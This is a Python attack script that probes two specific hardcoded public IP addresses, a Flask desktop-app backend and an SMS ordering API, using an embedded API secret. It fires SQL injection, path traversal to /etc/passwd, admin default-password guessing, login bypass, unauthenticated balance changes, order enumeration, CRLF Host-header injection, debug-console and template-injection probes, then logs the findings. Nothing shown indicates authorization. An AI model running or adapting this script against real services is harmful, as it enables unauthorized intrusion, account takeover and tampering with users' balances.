#!/usr/bin/env python3
"""Deep vulnerability probe for 9110 Flask + 8081 SMS API."""
from __future__ import annotations

import json
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any

MAIN = "http://43.154.128.116:9110"
SMS = "http://47.76.163.227:8081"
SECRET = "b9887333ae4c43858c9235e0ac4e0921"
TIMEOUT = 10


@dataclass
class Finding:
    severity: str
    title: str
    detail: str
    evidence: str = ""


findings: list[Finding] = []


def req(
    method: str,
    url: str,
    data: dict | bytes | None = None,
    headers: dict | None = None,
    content_type: str | None = None,
) -> tuple[int, str, dict]:
    h = dict(headers or {})
    body: bytes | None = None
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, bytes):
        body = data
    elif isinstance(data, str):
        body = data.encode()
    if content_type:
        h["Content-Type"] = content_type
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=TIMEOUT)
        raw = resp.read(12000).decode("utf-8", "replace")
        return resp.status, raw, dict(resp.headers)
    except urllib.error.HTTPError as e:
        raw = e.read(12000).decode("utf-8", "replace")
        return e.code, raw, dict(e.headers)


def add(sev: str, title: str, detail: str, evidence: str = "") -> None:
    findings.append(Finding(sev, title, detail, evidence))


def test_settings_disclosure() -> None:
    print("\n[1] Settings disclosure / injection")
    payloads = [
        "api_secret",
        "' OR '1'='1",
        "api_secret'--",
        "../../../etc/passwd",
        "%00api_secret",
        "api_secret\x00",
        "deduct_amount",
    ]
    for k in payloads:
        code, body, _ = req("GET", f"{MAIN}/api/desktop/settings?key={urllib.parse.quote(k)}")
        if '"ok": true' in body and '"value": ""' not in body and '"value": ""' not in body.replace(" ", ""):
            if k == "api_secret":
                add("HIGH", "未鉴权泄露 api_secret", "GET /api/desktop/settings?key=api_secret 无需登录", body[:300])
            elif "passwd" in body or "root:" in body:
                add("CRITICAL", "路径穿越读文件", k, body[:300])
        if "error" in body.lower() and ("sql" in body.lower() or "syntax" in body.lower()):
            add("HIGH", "SQL 错误回显", k, body[:300])


def test_unauth_balance_ops() -> None:
    print("\n[2] Unauthenticated balance manipulation")
    user = f"vulnprobe_{int(time.time())}"
    # register
    code, body, _ = req("POST", f"{MAIN}/api/desktop/register", {"username": user, "password": "test1234"})
    print("register", code, body[:200])

    code, body, _ = req("GET", f"{MAIN}/api/desktop/user-info?username={user}")
    print("user-info", code, body[:200])
    bal_before = body

    # decrease without auth
    for payload in [
        {"username": user, "amount": "-100"},
        {"username": user, "amount": "0"},
        {"username": user, "amount": "999999"},
        {"username": "admin", "amount": "-100"},
        {"username": user, "amount": "1", "api_secret": SECRET},
    ]:
        code, body, _ = req("POST", f"{MAIN}/api/desktop/decrease-balance", payload)
        print("decrease", payload, "->", code, body[:150])
        if code == 200 and '"ok": true' in body:
            if payload.get("amount") in ("-100", "999999") or payload.get("username") == "admin":
                add("CRITICAL", "未鉴权改余额", str(payload), body[:300])

    code, body2, _ = req("GET", f"{MAIN}/api/desktop/user-info?username={user}")
    if bal_before != body2:
        add("HIGH", "余额可被未鉴权接口修改", user, f"before={bal_before[:120]} after={body2[:120]}")

    # IDOR user-info
    for u in ["admin", "test", "1", "' OR 1=1--", "../admin"]:
        code, body, _ = req("GET", f"{MAIN}/api/desktop/user-info?username={urllib.parse.quote(u)}")
        if '"balance"' in body and u not in (user,):
            add("MEDIUM", "任意用户余额枚举", u, body[:200])


def test_card_recharge_race() -> None:
    print("\n[3] Card recharge / replay")
    user = f"cardtest_{int(time.time())}"
    req("POST", f"{MAIN}/api/desktop/register", {"username": user, "password": "x"})
    fake_card = "FAKECARD123456"
    for _ in range(3):
        code, body, _ = req("POST", f"{MAIN}/api/desktop/card-recharge", {"username": user, "card_code": fake_card})
        print("card-recharge", code, body[:120])


def test_login_bypass() -> None:
    print("\n[4] Login / auth bypass")
    payloads = [
        {"username": "admin'--", "password": "x"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "admin\x00", "password": "x"},
        {"username": '{"username":"admin"}', "password": "x"},
    ]
    for p in payloads:
        code, body, hdrs = req("POST", f"{MAIN}/api/desktop/login", p)
        if '"ok": true' in body or '"token"' in body:
            add("CRITICAL", "桌面端登录绕过", str(p), body[:300])
        print("desktop login", p, code, body[:120])

    # admin form login
    for user, pwd in [("admin", "admin123"), ("admin", "123456"), ("admin", "admin"), ("' OR '1'='1", "x")]:
        code, body, hdrs = req("POST", f"{MAIN}/login", {"username": user, "password": pwd})
        if "dashboard" in body.lower() or code == 302 or "管理" in body:
            add("CRITICAL", "管理后台弱口令/绕过", f"{user}/{pwd}", body[:400])
        print("admin login", user, pwd, code, body[:80])


def test_api_fuzz() -> None:
    print("\n[5] Hidden API discovery")
    words = """
    settings user-info login register card-recharge decrease-balance recharge balance
    users list orders cards logs config project stats admin sms phone token contact
    notice version price deduct update delete create export records dashboard
    recharge-history order-history transactions reset-password change-password
    set-balance add-balance update-balance user-list card-list generate-card
    """.split()
    found = []
    for w in words:
        for pref in (f"/api/desktop/{w}", f"/api/{w}", f"/{w}"):
            code, body, _ = req("GET", f"{MAIN}{pref}")
            if code not in (404, 405):
                found.append((code, pref, body[:100]))
    for item in found:
        print("FOUND", item)
    if found:
        add("INFO", f"发现 {len(found)} 个非404端点", str(found[:15]), "")


def test_sms_api() -> None:
    print("\n[6] SMS API abuse")
    # secret in path - try weak/alternate secrets
    for sec in [SECRET, SECRET[:8], "admin", "test", "00000000000000000000000000000000"]:
        code, body, _ = req("POST", f"{SMS}/create/{sec}", json.dumps({"area": "86", "data": "13800138000"}).encode(), content_type="application/json")
        print("create secret", sec[:12], code, body[:120])
        if code == 200 and '"code":0' in body and sec != SECRET:
            add("CRITICAL", "弱 api_secret 可下单", sec, body[:200])

    # IDOR query other orders
    for oid in ["1", "2", "100", "99999", "1' OR '1'='1"]:
        code, body, _ = req("GET", f"{SMS}/query/{SECRET}/{urllib.parse.quote(oid)}")
        if '"code":0' in body or ('"data"' in body and '"code":-1' not in body):
            add("HIGH", "可枚举他人订单", oid, body[:200])
        print("query", oid, code, body[:100])

    # setsms without prior order
    code, body, _ = req("GET", f"{SMS}/setsms/{SECRET}/13800138000/123456")
    print("setsms", code, body[:100])

    # path traversal
    for p in [
        f"/query/{SECRET}/../admin",
        f"/setsms/{SECRET}/../../etc/passwd/1234",
        f"/create/{SECRET}%00",
    ]:
        code, body, _ = req("GET", f"{SMS}{p}")
        print("traversal", p, code, body[:80])

    # mass assignment / extra fields on create
    payloads = [
        {"area": "86", "data": "13800138000", "islink": True},
        {"area": "86", "data": "13800138000", "admin": True},
        {"area": "86", "data": "' OR 1=1--"},
    ]
    for pl in payloads:
        code, body, _ = req("POST", f"{SMS}/create/{SECRET}", json.dumps(pl).encode(), content_type="application/json")
        print("create payload", pl, code, body[:120])


def test_method_override() -> None:
    print("\n[7] HTTP method override / CORS")
    for hdr in [{"X-HTTP-Method-Override": "DELETE"}, {"X-Method-Override": "PUT"}]:
        code, body, _ = req("POST", f"{MAIN}/api/desktop/settings?key=test", {"value": "pwn"}, hdr)
        print("override", hdr, code, body[:100])

    code, body, hdrs = req("OPTIONS", f"{MAIN}/api/desktop/login")
    print("OPTIONS login", code, hdrs.get("Access-Control-Allow-Origin", ""), body[:80])
    if hdrs.get("Access-Control-Allow-Origin") == "*":
        add("MEDIUM", "CORS 反射 *", "/api/desktop/login", str(hdrs))


def test_host_header() -> None:
    print("\n[8] Host header / cache poisoning")
    for host in ["evil.com", "43.154.128.116:9110\r\nX-Injected: true"]:
        try:
            code, body, hdrs = req("GET", f"{MAIN}/", headers={"Host": host})
            print("host", repr(host), code, body[:60])
        except Exception as e:
            print("host err", host, e)


def test_rate_and_register() -> None:
    print("\n[9] Open registration abuse")
    ok = 0
    for i in range(5):
        u = f"spam{i}_{int(time.time())}"
        code, body, _ = req("POST", f"{MAIN}/api/desktop/register", {"username": u, "password": "x"})
        if '"ok": true' in body:
            ok += 1
    if ok == 5:
        add("LOW", "无限制开放注册", "5/5 注册成功", "")


def test_werkzeug_debug() -> None:
    print("\n[10] Debug / console / SSTI")
    paths = ["/console", "/__debug__", "/debug", "/?__debugger__=yes"]
    for p in paths:
        code, body, _ = req("GET", f"{MAIN}{p}")
        if code == 200 and ("console" in body.lower() or "debugger" in body.lower()):
            add("CRITICAL", "Werkzeug 调试台暴露", p, body[:200])
        print(p, code, body[:80])

    ssti = "{{7*7}}"
    code, body, _ = req("GET", f"{MAIN}/api/desktop/settings?key={urllib.parse.quote(ssti)}")
    if "49" in body and "7*7" not in body:
        add("CRITICAL", "SSTI in settings", ssti, body[:200])


def main() -> None:
    print("=== VULN DEEP PROBE ===")
    test_settings_disclosure()
    test_unauth_balance_ops()
    test_card_recharge_race()
    test_login_bypass()
    test_api_fuzz()
    test_sms_api()
    test_method_override()
    test_host_header()
    test_rate_and_register()
    test_werkzeug_debug()

    print("\n" + "=" * 60)
    print("FINDINGS SUMMARY")
    print("=" * 60)
    by_sev = {"CRITICAL": [], "HIGH": [], "MEDIUM": [], "LOW": [], "INFO": []}
    for f in findings:
        by_sev.setdefault(f.severity, []).append(f)
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        items = by_sev.get(sev, [])
        if not items:
            continue
        print(f"\n## {sev} ({len(items)})")
        for f in items:
            print(f"- {f.title}")
            print(f"  {f.detail}")
            if f.evidence:
                print(f"  evidence: {f.evidence[:200]}")

    out = "/workspace/analysis/vuln_findings.json"
    with open(out, "w") as fp:
        json.dump([f.__dict__ for f in findings], fp, ensure_ascii=False, indent=2)
    print(f"\nWrote {out}")


if __name__ == "__main__":
    main()
